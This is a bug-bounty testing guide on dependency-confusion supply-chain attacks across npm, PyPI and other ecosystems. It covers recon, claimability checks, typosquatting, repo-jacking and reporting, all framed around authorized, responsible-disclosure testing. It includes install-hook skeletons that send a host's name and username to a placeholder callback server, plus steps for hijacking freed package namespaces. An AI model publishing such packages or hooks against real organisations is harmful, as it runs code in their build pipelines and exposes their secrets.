# Dependency Confusion (Supply-Chain) — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** Dependency Confusion / substitution attacks — publishing a **public** package with an organisation's **internal/private** package name so a misconfigured resolver pulls the attacker's copy during install (npm · PyPI · RubyGems · Maven/Gradle · NuGet · Go · Composer); + adjacent supply-chain: typosquatting, repo-jacking, install-hook abuse.
**Impact ceiling:** **remote code execution in the CI/CD pipeline and developer machines** (the build often holds cloud creds, signing keys, and source) → **supply-chain compromise of the org and its downstream users**.
**Primary CWE:** CWE-829 (Inclusion of Functionality from an Untrusted Control Sphere) · CWE-427 (Uncontrolled Search Path Element — resolution-order confusion) · CWE-494 (Download of Code Without Integrity Check).

> ⚠️ **Authorized + responsible-disclosure ONLY.** Dependency confusion is a recognised bug-bounty class (Alex Birsan hit Apple/Microsoft/etc. in 2021 with **benign DNS callbacks**), but it publishes real packages to public registries. This kit is **detection + a benign-callback proof**: claim a name **only** for a target you are authorized to test, prove execution with a **DNS/HTTP beacon carrying only a non-sensitive marker** (hostname/pkg-name), **unpublish immediately**, and report so they reserve the namespace. **No** reverse shells, **no** data exfiltration beyond the execution proof, **no** persistence, **no** targeting names you can't attribute to your scope. Recon overlaps with [../JSFiles/](../JSFiles/) and [../Recon/](../Recon/).

---

## Read this first — why one published package owns the whole build

*New to this? Here's the whole bug in one picture.* Imagine a company that orders office supplies by **nickname**. Internally everyone calls one item "the blue binder," and they buy it from their trusted **in-house supply closet**. But their automated ordering system has a lazy rule: *"buy 'the blue binder' from whoever offers the newest version — the in-house closet **or** the public marketplace."* An attacker lists a product on the **public** marketplace called "the blue binder," stamps it **version 99**, and waits. The next automatic order grabs the **attacker's** box because it's "newer." And here's the sting: when the mailroom **opens** the box, it runs whatever's inside. In software, "opening the box" = the package **install step**, and that install step can **run code**. So the attacker's code executes **inside the company's build machines** — exactly where the crown-jewel secrets live. That's dependency confusion: same name, wrong source, code runs.

*In plain words — the three ingredients you need:* (1) a package name the company uses **privately** (the nickname), (2) that name is **unclaimed** on the public marketplace (nobody registered it there, so you can), and (3) the company's install tooling is willing to **look at the public marketplace** and **prefer the higher version**. Get all three and their build installs *your* package.

Organisations build software against **internal packages** — `@acme/config`, `acme-internal-utils`, `com.acme:shared` — that live on a **private** registry and are never meant to be public. Package managers resolve a name across the registries they're configured with, and a **misconfiguration** (public registry as primary/fallback, or "pick the highest version across all sources") lets an attacker **publish a public package with that exact internal name** and a **higher version**. The next `npm install` / `pip install` — very often inside **CI/CD** — pulls the **attacker's** package, and its **install hook runs code**. That's **RCE where the secrets live**: cloud keys, artifact-signing keys, source, deploy access.

**Why it pays Critical:**
- **RCE in CI/CD** — the build environment is high-trust: cloud IAM roles, registry creds, signing keys, private source. One install hook = org-wide compromise.
- **Supply-chain propagation** — a poisoned build ships to the org's **customers** (the SolarWinds-shaped nightmare, at package scale).
- **Zero victim interaction** — you don't phish anyone; you publish, and their automated pipeline pulls it on the next build.
- **Unauthenticated to discover** — the internal names leak in public JS bundles, repos, and manifests; anyone can read them.

**Report the confirmed pull, not the leaked name.** "`@acme/config` is referenced but not on npm" is a *lead*. "I published `@acme/config@99.99.99` (authorized), and a **DNS callback carrying the CI hostname** reached my server — proving their build executed my package" is the finding. The **callback from their build egress** is the proof; keep the package benign and pull it down after.

**The one mental model.** Find a package name the org **uses privately** but **hasn't claimed publicly**, publish a **higher-version** public package under that name with a **benign install-time beacon**, and wait for the org's resolver to **prefer yours**. Detection = *is this name claimable?*; proof = *did their build call back?*

---

## Master Testing Sequence — the testing order

> **This is the spine.** Stand up an **OOB host (interactsh/Collaborator)** first — the proof is an out-of-band callback from the target's build.

```
PHASE 0  RECON  ⭐        → harvest INTERNAL package names from leaked manifests / JS bundles / repos / registry configs (§1–§3)
PHASE 1  CLAIMABILITY ⭐  → for each name, is it UNCLAIMED on the PUBLIC registry? scope reserved? (§4–§5)
PHASE 2  RESOLUTION       → how does the target resolve? highest-version-wins? public primary/fallback? scoped? (§6)
PHASE 3  SAFE PROOF  ⭐    → publish a BENIGN higher-version pkg with a DNS/HTTP beacon (authorized name only) → wait for callback (§7–§8)
PHASE 4  RELATED          → typosquatting · repo-jacking / namespace reuse · install-hook mechanics · lockfile (§9–§11)
PHASE 5  IMPACT           → what a callback proves: CI/CD RCE, secret access, propagation; escalate/scope (§12)
PHASE 6  VALIDATE→REPORT  → FP filter (§13) · CVSS+CWE-829 (§14) · playbooks (§15) ·
                            SAFE+RESPONSIBLE: benign beacon, UNPUBLISH, report, help them reserve (§16) · dedup+report (§17)
```

**Phase-by-phase deliverable:**
1. **PHASE 0 — Recon ⭐.** Build a list of the org's **internal** package names. *Deliverable:* candidate names + the ecosystem (npm/PyPI/…).
2. **PHASE 1 — Claimability ⭐.** Filter to names **unclaimed** on the public registry (and unreserved scopes). *Deliverable:* claimable dependency-confusion candidates.
3. **PHASE 2 — Resolution.** Understand *why* the target would prefer the public copy (config/version rules). *Deliverable:* a plausible resolution path.
4. **PHASE 3 — Safe proof ⭐.** Publish a **benign** higher-version package (authorized name), beacon to your OOB, catch the callback. *Deliverable:* a target-build-sourced callback = confirmed DC. **Then unpublish.**
5. **PHASE 6 — Report.** FP filter, CVSS/CWE, responsible disclosure (§13–§17).

Reference anytime: payloads/commands → `DEPENDENCY_CONFUSION_ARSENAL.md`; checklist → `DEPENDENCY_CONFUSION_CHECKLIST.md`; scripts → `poc/`; playbooks **§15**.

---

# PART I — UNDERSTAND & RECON

# 1. The mechanic & the ecosystems

*In plain words:* a **package** is a reusable chunk of code someone else wrote that your app pulls in (like `react` or `requests`). A **registry** is the online store it's downloaded from — `npmjs.org` for Node, `pypi.org` for Python, etc. A **private registry** is the company's own internal store. The bug lives in the **resolver** — the piece of tooling that, given a name, decides *which store to download from*. If the resolver can see both the private store and the public one, and it picks by "newest version," an attacker who publishes a higher-numbered public package with the same name **wins the download**. The table below is the same trick across every language's tooling — read the "Code-exec on install" column as *"this is the moment the attacker's code runs."*

```
Vulnerable pattern:  the org depends on a PRIVATE name (e.g. @acme/config) but the resolver can also reach the PUBLIC
                     registry, and either (a) prefers public, or (b) picks the HIGHEST version across all sources.
Attack:              publish @acme/config@99.99.99 to the public registry with a benign install hook -> the org's next
                     install (usually in CI) pulls YOURS -> the hook runs -> callback (RCE-capable).
```
| Ecosystem | Manifest / config | Resolution risk | Code-exec on install |
|-----------|-------------------|-----------------|----------------------|
| **npm** (Node) | `package.json`, `package-lock.json`, `.npmrc` | scoped `@org/*` if scope unclaimed; highest-version; public primary | `preinstall`/`install`/`postinstall` scripts |
| **PyPI** (Python) | `requirements.txt`, `setup.py`, `pyproject.toml`, `pip.conf` | **`--extra-index-url` checks BOTH and picks highest version** (the classic) | `setup.py`/sdist build runs on install |
| **RubyGems** | `Gemfile`, `.gemspec` | source order; highest version | `extconf.rb` / native-extension build |
| **Maven/Gradle** (Java) | `pom.xml`, `build.gradle`, `settings.xml` | repository order; `groupId:artifactId` | build plugins (less auto-exec) |
| **NuGet** (.NET) | `.csproj`, `packages.config`, `nuget.config` | feed order; highest version | MSBuild targets / install scripts |
| **Go** | `go.mod`, `GOPROXY`/`GOPRIVATE` | less prone (full module path = domain) — but **GOPRIVATE misconfig** + **repo-jacking** | `go generate` / build (not auto on `go get`) |
| **Composer** (PHP) | `composer.json` | Packagist + private repos; `repositories` order | scripts (`post-install-cmd`) |

> **If this → then that:** the target uses **`--extra-index-url`** with pip, or an npm **scope they didn't reserve**, or "highest version wins" resolution → those internal names are **prime DC candidates**. Go/Cargo are more namespace-safe → pivot to **repo-jacking** (§10) there.

# 2. Harvest internal package names (the recon)

*In plain words:* before you can claim a name, you have to **learn the nicknames** — the internal package names the company uses but never published. Those names leak everywhere: in files that list a project's dependencies (a **manifest** — `package.json`, `requirements.txt`, etc.), in the compiled front-end JavaScript your browser downloads, and in the company's public code repositories. A **lockfile** (`package-lock.json`, `yarn.lock`) is a manifest's stricter cousin that pins exact versions — great for you because it lists *every* dependency, including deep internal ones. Your whole job in this phase: collect a candidate list of internal-looking names + which ecosystem each belongs to.

```
LEAKED MANIFESTS (the goldmine) — find these exposed on the web / in repos / wayback:
  package.json · package-lock.json · yarn.lock · .npmrc          (npm)
  requirements.txt · Pipfile · Pipfile.lock · setup.py · pyproject.toml · pip.conf   (PyPI)
  composer.json · composer.lock (PHP) · Gemfile · Gemfile.lock (Ruby) · pom.xml · build.gradle (Java) · *.csproj · nuget.config (.NET)
JS BUNDLES / SOURCE MAPS (see ../JSFiles/):
  internal @scope/ names, require('acme-internal'), import ... from '@acme/...' in front-end JS / .map files.
PUBLIC REPOS (GitHub/GitLab):
  the org's repos, employees' dotfiles, CI configs (.github/workflows, .gitlab-ci.yml, Jenkinsfile) referencing internal pkgs;
  .npmrc / .pypirc / nuget.config committed with a PRIVATE registry URL (proves private packages exist -> hunt the names).
OTHER:
  Docker images / layers, public artifacts, error pages / stack traces exposing module paths, job posts naming internal tools.
```
> **If this → then that:** you find a committed **`.npmrc` with `registry=https://npm.acme-internal.com`** or a `pip.conf` with an internal `index-url` → the org **uses private packages** → every internal-looking name in their manifests/bundles is a DC candidate. Use `poc/manifest_scan.py` to extract names from any manifest you collect.

# 3. Classify the names (which are "internal")

```
□ SCOPED npm: @acme/* where the @acme scope is NOT reserved on npmjs.org -> highly claimable.
□ Unusual/org-specific unscoped names (acme-config, acme-logger, internal-auth) NOT on the public registry.
□ Names referencing internal services/products/teams.
□ Names present in the private registry config but absent from public.
Exclude: well-known public packages (react, lodash, requests) - those aren't confusable.
```

---

# PART II — DETECTION (is it claimable?)

# 4. Claimability check (the core detection)

*In plain words:* "claimable" just means **can I register this name on the public store myself?** You check by asking the public registry for the name and reading the answer: **404 (not found)** = nobody has it, so *you* can publish it = **claimable**. **200 (found)** = someone already owns it, so you can't. This is a plain read-only lookup — you're not publishing anything yet, just window-shopping to see which nicknames are still up for grabs. A name the company **uses privately** that **404s publicly** is the golden ticket.

For each candidate name, query the **public** registry (read-only) — does it exist?
```
npm:      GET https://registry.npmjs.org/<name>            -> 404 = UNCLAIMED (claimable) ; 200 = taken
          scope:  GET https://registry.npmjs.org/-/org/<scope>  / try to see if @scope is reserved
PyPI:     GET https://pypi.org/pypi/<name>/json            -> 404 = UNCLAIMED ; 200 = taken
RubyGems: GET https://rubygems.org/api/v1/gems/<name>.json -> 404 = UNCLAIMED
NuGet:    GET https://api.nuget.org/v3-flatcontainer/<name>/index.json -> 404 = UNCLAIMED
```
A name that is **referenced internally** but **404s on the public registry** = a **dependency-confusion candidate**. `poc/claimable_check.py` batches this (read-only registry lookups; low-FP).
> **If this → then that:** an internal `@acme/config` **404s on npm** and the `@acme` scope is **unreserved** → claimable → proceed to resolution (§6) and the safe proof (§7). If it 200s (already public), check **who owns it** and the version — a defensively-reserved placeholder is fine; a squatter is a different problem.

# 5. Scope & namespace reservation (npm/others)

```
□ npm SCOPE unreserved: if @acme isn't an org/user on npmjs, you can publish @acme/anything -> confusion for ALL their scoped pkgs.
□ The org SHOULD have published placeholder public packages / reserved the scope defensively — absence = the vuln.
□ Some registries proxy public+private under one URL (Artifactory/Nexus virtual repos) with a resolution policy -> that policy is the bug.
```

# 6. Resolution rules (why the public copy wins)

*In plain words:* the name being claimable isn't enough — the company's tooling still has to **choose your public copy over their private one**. This section is the "why would it ever do that?" answer, and there are only a few common reasons. The big one is **highest-version-wins**: many tools, when the same name exists in two stores, just grab the biggest version number — so you publish `99.99.99` and beat their private `1.4.2` every time. The other reasons are ordering/fallback (public store checked first, or used when the private one doesn't have the name) and merge policies in proxy servers like Artifactory/Nexus. `pip`'s `--extra-index-url` is the textbook offender because it literally queries *both* stores and takes the highest.

```
HIGHEST-VERSION-WINS: publish version 99.99.99 -> beats the private 1.x. (npm/pip-extra-index/nuget/rubygems)
PUBLIC-PRIMARY / FALLBACK: public registry is tried first, or when the private is unreachable/misses the name.
pip --extra-index-url: pip queries the DEFAULT (public) AND the extra index and installs the HIGHEST version -> classic DC.
npm no scope + public registry default: an unscoped internal name resolves straight to public.
Artifactory/Nexus VIRTUAL repo: the merge policy may prefer the "remote" (public) over "local" (private).
```
> **If this → then that:** they use `pip install -i <private> --extra-index-url https://pypi.org/simple` → **highest version across both wins** → publish a higher version → you win. Pin the version high (`99.99.99`) in your proof package.

---

# PART III — THE SAFE, BENIGN PROOF (authorized names only)

> Everything here publishes to a **real public registry**. Do it **only** for a name you're **authorized** to claim, with a **benign** beacon, and **unpublish immediately** after the callback. This is the exact Birsan-style proof programs accept — keep it that way.

# 7. Build a benign callback package

*In plain words:* now you prove the bug is real — but **safely**. An **install hook** is a little script a package is allowed to run automatically the moment it's installed (npm's `preinstall`/`postinstall`, Python's `setup.py`). Attackers abuse this to run malware; **you** use it to run one harmless "ping home." That ping is a **callback** (also called **OOB** — *out-of-band* — because it comes back over a separate channel, DNS or HTTP, not the web page you were poking). You stand up a listener (interactsh/Burp Collaborator gives you a unique URL), and your package's hook sends a request to it carrying only a **token** (a random ID so you know it's yours) plus the **hostname** (so you can tell a CI build from a laptop). That's the entire PoC: *"my code ran, here's where."* No stealing, no shell, no persistence — because the callback alone already proves code execution.

```
The install hook must do ONE thing: a DNS/HTTP callback to YOUR OOB host carrying a NON-SENSITIVE marker so you can
prove execution and identify the environment WITHOUT exfiltrating data:
  - a fixed token (correlates to this target/name)
  - hostname + username + cwd  (proves WHERE it ran — CI vs dev — the minimum context)
  NOTHING ELSE: no env dumps, no file reads, no reverse shell, no persistence.
```
```
npm (package.json):
  "name":"@acme/config","version":"99.99.99","scripts":{"preinstall":"node beacon.js"}
  // beacon.js: send an HTTP/DNS request to https://<token>.<your-oob>/ with os.hostname()+os.userInfo().username
PyPI (setup.py):
  in setup.py, on build/install, urllib.request to https://<token>.<your-oob>/ with socket.gethostname()+getpass.getuser()
  version="99.99.99"
```
`poc/benign_callback_pkg.py` **generates** (does not publish) a ready-to-review benign package skeleton for npm or PyPI, beaconing to your OOB. You review it, publish manually on an authorized engagement, then unpublish.
> **If this → then that:** you can only publish for names in your **authorized scope** — never claim a name you can't tie to your target. The beacon proves execution; that's the whole PoC. Anything beyond a benign callback crosses into an actual supply-chain attack — don't.

# 8. Publish, catch the callback, then UNPUBLISH

```
1) Bump the version ABOVE the private one (99.99.99) so resolution prefers yours (§6).
2) Publish to the public registry (npm publish / twine upload) — authorized name only.
3) Watch your OOB: a DNS/HTTP callback from the TARGET's build/CI/dev egress carrying your token = CONFIRMED DC. ⭐
4) UNPUBLISH / yank / deprecate the package immediately (npm unpublish, PyPI delete/yank). Note the window in your report.
5) Report at once so the org reserves the name/scope defensively.
```
> **If this → then that:** the callback comes from a **cloud CI egress** (GitHub Actions/GitLab/Jenkins ranges) → you have **RCE in their pipeline** (Critical). A callback from a **corp/dev IP** → RCE on a developer machine (still Critical). No callback after a reasonable window → the name may be reserved, resolution favours private, or it's not built often — re-check claimability/version.

---

# PART IV — RELATED SUPPLY-CHAIN TECHNIQUES

# 9. Typosquatting & combosquatting

*In plain words:* dependency confusion tricks the **machine** (the resolver picks the wrong source). **Typosquatting** tricks the **human** — you register a package named like a common misspelling of a popular one (`reqiests` for `requests`), so when a developer fat-fingers the install command, they get yours. **Combosquatting** is the same idea using easy-to-confuse separators (`acme-utils` vs `acme_utils` vs `acmeutils`). Lower hit-rate than true confusion because it depends on someone making a typo, but it's a real, reportable supply-chain risk — same benign-proof discipline applies.

```
Publish a package whose name is a common TYPO or look-alike of a real dependency (reqiests/requsts vs requests;
python-dateutil vs dateutil; cross-env vs crossenv) so a mistyped install pulls yours.
Combosquatting: acme-utils vs acme_utils vs acmeutils (separator/hyphen/underscore variants).
Detection/defense angle: flag the org's deps that have obvious squat neighbours; report proactively.
```
> Same benign-proof discipline. Typosquatting relies on human error rather than resolver config, so it's lower-probability but real — report as a supply-chain hygiene issue with a benign proof.

# 10. Repo-jacking / namespace reuse (the Go/GitHub angle)

*In plain words:* some ecosystems (Go especially) name packages by their **full web address**, e.g. `github.com/someuser/somepkg`. That looks safe — you can't confuse a full URL. But if `someuser` **deleted or renamed** their GitHub account, that username is now **free to register**. Grab it, host a package at the exact old path, and every project still importing `github.com/someuser/somepkg` now pulls **your** code. That's **repo-jacking** — hijacking an abandoned name rather than confusing a resolver. Same for expired domains and dead npm/PyPI maintainer accounts. This is your go-to move when the ecosystem is too namespace-strict for classic confusion.

```
A dependency references a GitHub org/user that was RENAMED or DELETED (go.mod: require github.com/olduser/pkg; a broken
import URL; a redirect that no longer resolves). Re-register the freed username/org and you control the module -> supply-chain RCE.
Also: abandoned npm/PyPI maintainer accounts, expired domains used as package/module homepages.
```
> **If this → then that:** a `go.mod` / import URL points at a **github.com/<user>** that now 404s (deleted/renamed) → **repo-jacking**: register that username, host the module, and the org's `go get`/build pulls yours. Cross-ref [../HostHeader/](../HostHeader/)-style takeover thinking and broken-link hijacking.

# 11. Install-hook mechanics & lockfile notes

```
INSTALL HOOKS that execute code (where the RCE actually fires):
  npm: preinstall/install/postinstall (also prepare) ; pip: setup.py/sdist build ; gem: extconf.rb ; composer: scripts.
LOCKFILES: a pinned lockfile (package-lock.json/poetry.lock with hashes) BLOCKS confusion for pinned deps -> but CI that runs
  `npm install` (not `npm ci`) or resolves a NEW/unpinned transitive dep is still exposed. Transitive internal deps count.
```

---

# PART V — IMPACT

# 12. What a callback proves (and how to scope it)

*In plain words:* **CI/CD** is the company's automated **build/test/deploy pipeline** — the robot that turns code into shipped software. It's the juiciest place for your code to run because that robot holds the master keys: cloud credentials, code-signing keys, deploy access, the full source. So a callback *from a CI machine* isn't "I ran a script" — it's "I can run code where all the secrets live." The important discipline: you now *could* read those secrets, but you **describe** them in your report ("build env exposes `AWS_*`, `NPM_TOKEN`") rather than **stealing** them. Proving execution + naming what's reachable = full Critical impact, cleanly.

```
CI/CD RCE:   the beacon ran in the build -> code exec with the pipeline's identity: cloud IAM role, registry/signing creds,
             source access, deploy keys. Chain to ../SSRF/ (cloud metadata) mentally — but the pipeline creds are often right there.
SECRET ACCESS: build env vars (NPM_TOKEN, AWS_*, GH_TOKEN) are reachable from the hook -> DO NOT exfil them; NAME the exposure
             in the report (you proved execution; the secret reachability is the impact you describe, not data you take).
PROPAGATION: a poisoned build artifact ships to downstream users -> supply-chain compromise of the org's customers.
DEV MACHINE: a callback from a workstation -> RCE on a developer -> lateral movement risk.
```
> **If this → then that:** callback from CI → report **Critical RCE in the build pipeline** and *describe* the reachable secrets/propagation (don't harvest them). The benign execution proof + the environment context (hostname) is enough to establish full impact.

---

# PART VI — VALIDITY, SEVERITY & REPORTING

# 13. False positives — STOP reporting these (auto-reject)

*In plain words:* a **false positive** is something that *looks* like the bug but isn't a payable finding — and this class has a lot of them because the early steps (a leaked name, a claimable name) feel like wins but are only **leads**. The rule to keep in your head: the finding isn't "I *found* an internal name" or "I *could* claim it" — it's "**their build actually ran my package and called home.**" Everything short of that callback is homework, not a report. Read the table as "tempting thing I saw" → "why a triager will close it" → "what would make it real."

| # | Commonly mis-reported | Why it's NOT (yet) DC | What makes it real |
|---|---|---|---|
| 1 | **"Internal name found in a bundle"** | A referenced name ≠ confusable | The name is **unclaimed** on the public registry AND the resolver can reach public |
| 2 | **The name is already public** (someone owns it) | Not claimable by you | It's **404/unregistered**, or the org's scope is unreserved |
| 3 | **You published but got no callback** | No proof of a pull | A callback from the **target's** build/dev egress carrying your token |
| 4 | **A callback from YOUR own machine / a scanner** | Not the target | Correlate the source IP/ASN to the target's CI/corp egress + your unique token |
| 5 | **Lockfile pins everything with hashes** | `npm ci`/hashed installs resist it | An unpinned/transitive path, or CI that runs `npm install` |
| 6 | **You dumped CI secrets to "prove" it** | That's over-reach / harmful | A **benign** beacon (hostname/token only) is the accepted proof — never exfil |
| 7 | **Go/Cargo full-path module "confusion"** | Namespaced by domain | It's **repo-jacking** (a freed username), a different (still valid) bug |

> **Golden rule:** a DC finding = a name the org **uses privately** + **claimable publicly** + a **benign callback from their build** proving your package executed. A leaked name, an unclaimable name, or "no callback" is a **lead**. And the proof is **always benign** — a beacon, never a payload.

---

# 14. Severity calibration (CVSS + CWE)

| Scenario | Typical | CWE |
|---|---|---|
| **Callback from CI/CD (RCE in the pipeline)** | **Critical (9–10)** | CWE-829 / CWE-427 / CWE-494 |
| **Callback from a developer machine (RCE)** | **High → Critical** | CWE-829 |
| **Claimable internal name + reachable public resolver (no callback yet)** | **High** | CWE-829 | 
| **Unreserved npm scope (all scoped pkgs confusable)** | **High → Critical** | CWE-829 |
| **Repo-jacking of an in-use module** | **High → Critical** | CWE-829 / CWE-494 |
| **Typosquat neighbour (hygiene, benign proof)** | **Medium** | CWE-829 |
| **Internal name leaked, but unclaimable / lockfile-pinned** | **Low / Informational** | — |

**CVSS anchor (CI/CD RCE):** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → **~9–10 Critical** (scope-changed: your code runs in their trusted build). Anchor to **CWE-829**; note **CWE-427** (resolution order) and **CWE-494** (no integrity check).

*Decoding that CVSS string in plain English:* **AV:N** (Attack Vector: Network) = you attack over the internet, no physical/local access needed — you just publish to a public registry. **AC:L** (Attack Complexity: Low) = no special timing or luck; it fires on their next build. **PR:N** (Privileges Required: None) = you don't need any account on their systems. **UI:N** (User Interaction: None) = nobody has to click anything; the pipeline pulls it automatically. **S:C** (Scope: Changed) = the damage crosses a trust boundary — your code, published to a public store, ends up executing inside their *private, trusted* build — and this single flag is what pushes the score into Critical territory. **C:H/I:H/A:H** (Confidentiality/Integrity/Availability: High) = once your code runs there it can read secrets, alter builds, and break the pipeline. All maxed, this exact vector computes to a **perfect 10.0**. (Many raters instead score it **AC:H** — success depends on the target's resolver config and a build actually running, which are outside your control at attack time — and that eases it to **~9.x**; still Critical either way.)

---

# 15. Impact-escalation playbooks — "you found X, now do Y"

### 15.1 You found: *an unclaimed internal `@scope/pkg` on npm*
- **Escalate:** confirm the scope is unreserved (§5); (authorized) publish a benign `99.99.99` beacon; catch the CI callback (§7–§8); **unpublish**; report. **Severity:** Critical (CI RCE).

### 15.2 You found: *a committed `.npmrc`/`pip.conf` with a private registry*
- **Escalate:** it proves private packages exist → harvest their names from manifests/bundles → claimability check (§4). **Severity:** unlocks the hunt.

### 15.3 You found: *pip `--extra-index-url` in a CI config*
- **Escalate:** highest-version-wins → an internal name published higher on public wins (§6). **Severity:** Critical.

### 15.4 You found: *a `go.mod` importing a deleted GitHub user*
- **Escalate:** repo-jacking — register the username, host the module, benign beacon (§10). **Severity:** High/Critical.

### 15.5 You found: *a callback from their CI egress*
- **Escalate:** you have pipeline RCE — **describe** the reachable secrets/propagation (don't harvest), unpublish, report Critical (§12/§16). **Severity:** Critical.

---

# 16. SAFE-PoC & responsible disclosure (read before publishing anything)

```
DO:
  □ Detect first (recon + claimability) — most of the value is confirming the exposure WITHOUT publishing.
  □ Publish ONLY a name you're authorized to claim for THIS target; use a BENIGN beacon (DNS/HTTP + token + hostname).
  □ Pin a high version so resolution prefers yours; keep the package tiny and inert otherwise.
  □ UNPUBLISH / yank / deprecate immediately after the callback; record the publish->unpublish window in the report.
  □ Report at once; recommend they RESERVE the name/scope (publish a placeholder) and fix resolution config.
DON'T:
  □ Exfiltrate env vars/secrets/source, drop a reverse shell, or leave a persistent/backdoored package up. Beacon only.
  □ Publish names you can't attribute to your authorized scope (that harms unrelated orgs — out of bounds).
  □ Mass-publish across a registry, typosquat popular packages for real users, or target names outside scope.
  □ Break the build (no destructive install hooks) or run it against production deploy pipelines carelessly.
```
> The single rule: **a benign callback from the target's build is the entire proof — publish minimally, prove execution, pull it down, and report so they can defend.** You never need a payload, and you never touch a name outside your scope.

**Remediation to include:** reserve internal names/scopes on the public registry (publish placeholders); configure the resolver to **only** use the private registry for internal scopes (npm scope→registry mapping, pip `--index-url` not `--extra-index-url`, explicit repository pinning in Maven/Gradle/NuGet); use **lockfiles with integrity hashes** and `npm ci` / `pip install --require-hashes`; verify package **provenance/signatures**; segregate CI credentials (least privilege, short-lived); block outbound egress from build agents; monitor for public publications matching internal names.

---

# 17. Reporting, CWE/CVSS & de-duplication

Use `DEPENDENCY_CONFUSION_REPORT_TEMPLATE.md`. Minimum:
```
1. Title       "Dependency confusion in <ecosystem>: internal package <name> is claimable → RCE in CI/CD (OOB-confirmed)"
2. Severity    CVSS 3.1 vector + score + CWE-829 (+ 427/494)
3. Asset       the internal name(s) + ecosystem + where you found them + the claimability evidence (public 404)
4. Summary     the org uses <name> privately, it's unclaimed publicly, and their resolver pulled my benign public copy
5. Steps       recon → claimability 404 → (authorized) benign publish 99.99.99 → the callback log (target egress + token) → UNPUBLISH
6. PoC         the OOB callback (source = target CI/dev, your token, hostname) ; the benign beacon source ; the unpublish note
7. Impact      RCE in the build pipeline; reachable secrets / downstream propagation (described, not exfiltrated)
8. Remediation reserve names/scopes, fix resolution config, hashed lockfiles, provenance, CI least-privilege (§16)
```
**De-dup:** one **resolution root cause** (e.g. an unreserved npm scope) = one report even if many names are confusable — list them, prove one with a callback. A DC RCE and the underlying "internal names leaked in the bundle" are **one** report (lead with the RCE).

---

# 18. Automation & red-team notes

**Automation (detect at scale, publish only when authorized):**
```
poc/manifest_scan.py   — extract dependency names from package.json/requirements.txt/composer.json/Gemfile/etc.
poc/claimable_check.py — batch read-only public-registry lookups (npm/PyPI/...) -> which names are UNCLAIMED
poc/benign_callback_pkg.py — GENERATE (not publish) a benign beacon package skeleton (npm/PyPI) for an authorized proof
confused (visma-prodsec)   — scans a manifest for claimable deps (Go tool) ; Snyk/OSS-scanners for supply-chain
your OOB (interactsh)      — catch the build's DNS/HTTP callback
```
- **Quality gate:** never submit "internal name found." Submit a **claimable** name (public 404) and, where authorized, a **benign callback from the target's build**. Keep the proof inert; unpublish; report fast.

**Red-team angles (authorized engagements):**
```
□ Harvest internal @scopes from front-end bundles (../JSFiles/) → claimability → CI RCE via a benign beacon.
□ Committed .npmrc/.pypirc/nuget.config with private URLs → proves private packages → name-hunt.
□ Transitive internal deps (a public pkg that depends on an internal name) → confusion even if the top-level is pinned.
□ Repo-jacking freed GitHub orgs referenced in go.mod / import URLs.
□ Build-agent egress → cloud metadata / internal network (describe; chain mentally to ../SSRF/).
```

---

# Appendix A — Workflow cheat sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│                DEPENDENCY CONFUSION (SUPPLY-CHAIN)                          │
│                    authorized + benign-proof ONLY                          │
├──────────────────────────────────────────────────────────────────────────┤
│ 0. RECON ⭐: harvest INTERNAL pkg names — leaked manifests, JS bundles      │
│    (../JSFiles/), public repos, committed .npmrc/pip.conf §1-§3            │
│ 1. CLAIMABLE ⭐: name UNCLAIMED on the public registry? scope unreserved?   │
│    (poc/claimable_check.py — read-only 404 check) §4-§5                    │
│ 2. RESOLUTION: highest-version-wins? public primary? pip --extra-index? §6 │
│ 3. SAFE PROOF ⭐ (authorized name ONLY):                                    │
│    benign beacon pkg @ 99.99.99 → publish → CALLBACK from target build →   │
│    UNPUBLISH → report §7-§8,§16                                            │
│ 4. RELATED: typosquat §9 · repo-jacking (go.mod freed user) §10 ·          │
│    install-hooks/lockfiles §11                                             │
│ 5. IMPACT: CI/CD RCE, reachable secrets, propagation (DESCRIBE) §12        │
│ 6. VALIDATE→REPORT: callback-is-proof FP filter §13 · CVSS/CWE-829 §14 ·   │
│    benign+UNPUBLISH+responsible-disclosure §16 · dedup §17                 │
└──────────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Decision tree

```
Internal package name harvested (bundle/manifest/repo)? §2
│
├─ Is it UNCLAIMED on the PUBLIC registry (404)? §4
│     ├─ NO (taken) → who owns it? version? (defensive placeholder = fine; squatter = separate issue)
│     └─ YES → is the scope unreserved / can the target's resolver reach public? §5-§6
│           ├─ NO → not confusable here (report the leaked-name hygiene only if notable)
│           └─ YES → CLAIMABLE dependency-confusion candidate. HIGH ⭐
│
├─ (authorized) publish a BENIGN 99.99.99 beacon for THIS scope's name → wait for OOB §7-§8
│     ├─ callback from the TARGET's CI egress → RCE in the pipeline. CRITICAL ⭐  → describe secrets/propagation §12
│     ├─ callback from a dev machine → RCE on a developer. HIGH/CRIT
│     └─ no callback → recheck version/reservation/build-frequency ; maybe lockfile-pinned §11
│     → UNPUBLISH immediately, report, help them reserve §16
│
└─ Namespaced ecosystem (Go/Cargo)? → REPO-JACKING: freed GitHub user in go.mod / import URL? → register → beacon §10

ALWAYS: benign beacon (hostname+token only) is the WHOLE proof · authorized names only · unpublish · CWE-829 §14.
```

---

# Appendix C — References & further reading

**Class-defining research**
- **Alex Birsan** — "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- Microsoft — "3 Ways to Mitigate Risk When Using Private Package Feeds" (the official mitigation whitepaper).
- GitHub Security Lab / Sonatype / Snyk — dependency-confusion & supply-chain deep-dives.

**Core methodology**
- HackTricks — Dependency Confusion: https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/dependency-confusion
- OWASP — Software Component Verification / Dependency-Check; npm/PyPI security docs on scopes & registries.
- PayloadsAllTheThings — Dependency Confusion / CI-CD: https://github.com/swisskyrepo/PayloadsAllTheThings

**Tools**
- **confused** (visma-prodsec) — manifest → claimable-dependency scanner: https://github.com/visma-prodsec/confused
- **snyk** / **OSS Index** / **dependency-check** — supply-chain scanning; **interactsh** — OOB callback capture.
- Registry APIs (read-only): registry.npmjs.org · pypi.org/pypi/<name>/json · rubygems.org/api · api.nuget.org.

**Standards**
